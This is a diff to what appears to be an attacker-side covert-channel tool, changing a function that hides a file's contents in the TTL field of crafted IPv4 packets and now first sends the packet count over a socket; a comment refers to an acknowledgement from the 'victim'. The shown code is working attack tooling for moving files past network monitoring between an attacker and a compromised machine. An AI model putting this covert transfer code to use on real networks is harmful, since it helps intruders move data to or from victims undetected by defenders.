@@ -354,19 +354,23 @@ def bin_to_text(binary):
     return ''.join(chr(int(binary[i:i + 8], 2)) for i in range(0, len(binary), 8))
 
 
-def transfer_file_ipv4_ttl(dest_ip, file_path):
-    # Read the content of the file to hide in TTL
+def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
+    # a) Read the content of the file to hide in TTL
     with open(file_path, 'r') as file:
         file_content = file.read()
 
-    # Convert file content to binary
+    # b) Convert file content to binary
     binary_data = text_to_bin(file_content)
 
-    # Split the binary data into chunks that fit within the TTL range (0-255)
-    chunk_size = 8  # Define the chunk size
-    chunks = [binary_data[i:i + chunk_size] for i in range(0, len(binary_data), chunk_size)]
+    # c) Split the binary data into chunks that fit within the TTL range (0-255)
+    ttl_chunk_size = 8
+    chunks = [binary_data[i:i + ttl_chunk_size] for i in range(0, len(binary_data), ttl_chunk_size)]
 
-    # Craft packets for each chunk and send them with a corresponding TTL value
+    # d) Send total number of packets to client
+    total_packets = str(len(chunks))
+    client_sock.send(total_packets.encode())
+
+    # e) Craft packets for each chunk and embed them with a corresponding TTL value
     for i, chunk in enumerate(chunks):
         # Convert the chunk to integer (0-255)
         chunk_value = int(chunk, 2)
@@ -410,7 +414,7 @@ def transfer_file_covert(sock: socket.socket, dest_ip: str, dest_port: int, choi
             print(constants.FILE_NAME_TRANSFER_MSG.format(file_name))
 
             # Transfer File
-            transfer_file_ipv4_ttl(dest_ip, file_path)
+            transfer_file_ipv4_ttl(sock, dest_ip, file_path)
 
             # # Get an ACK from victim for success
             transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
